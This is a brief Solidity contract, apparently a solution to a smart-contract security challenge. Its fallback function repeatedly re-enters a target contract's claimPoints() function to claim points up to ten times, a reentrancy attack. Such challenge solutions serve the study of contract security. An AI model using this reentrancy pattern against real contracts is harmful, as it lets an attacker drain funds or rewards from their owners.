// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface Ichallenge {
    function claimPoints() external;
}

contract ChallengeFive {
    address private constant challengeAddress = 0xB76AdFe9a791367A8fCBC2FDa44cB1a2c39D8F59;
    uint256 public callCount;

    constructor() {
        callCount = 0;
    }

    function solveChallenge() external {
        callCount++;
        Ichallenge(challengeAddress).claimPoints();
    }

    fallback() external {
        //callback into challenge
        if (callCount < 10) {
            callCount++;
            Ichallenge(challengeAddress).claimPoints();
        }
    }
}
